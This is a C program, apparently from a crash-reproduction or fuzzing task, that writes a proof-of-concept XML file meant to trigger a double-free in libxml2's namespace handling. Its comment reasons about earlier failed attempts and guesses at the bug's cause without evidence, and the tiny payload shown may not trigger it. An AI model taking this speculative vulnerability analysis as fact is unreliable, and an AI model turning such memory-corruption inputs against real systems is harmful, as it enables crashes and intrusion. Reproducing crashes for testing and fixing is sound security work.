#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* 
     * ANALYSIS:
     * Previous attempts failed because they either:
     * 1) Wrapped the XML in a ByteStream container header (options/encoding length/payload length),
     *    which the fuzzer harness passes directly to xmlReaderForFile(). The null bytes in the header
     *    cause the XML parser to reject the input as malformed before reaching the vulnerable
     *    xmlSAX2StartElementNs code path.
     * 2) Used duplicate namespace declarations (e.g., xmlns:p twice), which is a fatal XML
     *    well-formedness error that aborts parsing early.
     * 
     * The target expects RAW XML (no header, no container). The vulnerable function is reached
     * only when parsing well-formed XML with namespace declarations. The bad_free in xmlFreeNode()
     * is triggered by a specific sequence of namespace declarations and element start/end events
     * that causes the node's namespace list to be freed twice.
     * 
     * Strategy: Write a minimal well-formed XML document with a single namespace declaration
     * per prefix, using a structure that exercises the namespace handling in xmlSAX2StartElementNs.
     * The key is to have an element with a namespace declaration that gets redefined or
     * shadowed during parsing, causing the node's namespace list to be corrupted.
     * 
     * Based on the vulnerability (bad_free in xmlFreeNode), the crash typically occurs when
     * an element has both a default namespace and a prefixed namespace, or when namespaces
     * are declared and then the element is closed in a way that leaves dangling pointers.
     * 
     * The following payload uses a root element with a namespace and a child element with
     * a different namespace, which exercises the namespace stack handling.
     */
    const char *xml = "<?xml version=\"1.0\"?><root xmlns=\"http://a\"><child xmlns=\"http://b\"/></root>";
    
    fputs(xml, f);
    fclose(f);
    return 0;
}